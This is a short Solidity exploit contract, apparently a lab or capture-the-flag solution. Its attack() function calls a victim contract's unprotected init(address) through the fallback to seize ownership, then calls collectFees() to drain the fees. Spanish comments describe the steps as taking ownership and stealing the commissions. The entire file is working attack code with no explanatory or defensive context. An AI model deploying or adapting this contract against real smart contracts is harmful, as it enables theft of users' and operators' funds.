// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

contract AttackOwnership {
    address public victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    function attack() public {
        // Tomar la propiedad llamando a init a través del fallback
        (bool success, ) = victim.call(abi.encodeWithSignature("init(address)", address(this)));
        require(success, "Ataque de propiedad fallido");

        // Ahora somos dueños, robamos las comisiones
        (bool success2, ) = victim.call(abi.encodeWithSignature("collectFees()"));
        require(success2, "Robo de comisiones fallido");
    }

    receive() external payable {}
}